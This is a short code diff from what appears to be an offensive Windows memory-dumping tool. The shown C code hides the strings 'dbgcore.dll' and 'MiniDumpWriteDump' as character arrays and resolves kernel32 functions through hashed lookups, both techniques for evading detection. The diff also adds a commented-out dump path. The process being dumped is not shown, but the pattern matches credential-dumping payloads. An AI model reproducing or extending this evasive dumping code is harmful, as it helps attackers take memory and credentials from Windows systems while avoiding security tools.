@@ -55,12 +55,14 @@ VOID WindowsEntrypoint(LPCSTR szDumpPath)
 
   char sz_DbgHelp[]  = { 'd', 'b', 'g', 'c', 'o',
                          'r', 'e', '.', 'd', 'l',
-                         'l', 0 };
-
+                         'l',  0 };
   char sz_DbgFunc[]  = { 'M', 'i', 'n', 'i', 'D',
 	  		 'u', 'm', 'p', 'W', 'r',
 			 'i', 't', 'e', 'D', 'u',
 			 'm', 'p', 0 };
+  /*char sz_DbgPath[]  = { 'C', ':', '\\', 'd', 'u',
+	  		 'm', 'p', '.', 'd', 'm',
+			 'p',  0 }; */
 
   Kernel32Ptr         = GetPeBase(HASH_KERNEL32);
   LoadLibraryA        = GetPeFunc(Kernel32Ptr, HASH_LOADLIBRARYA);
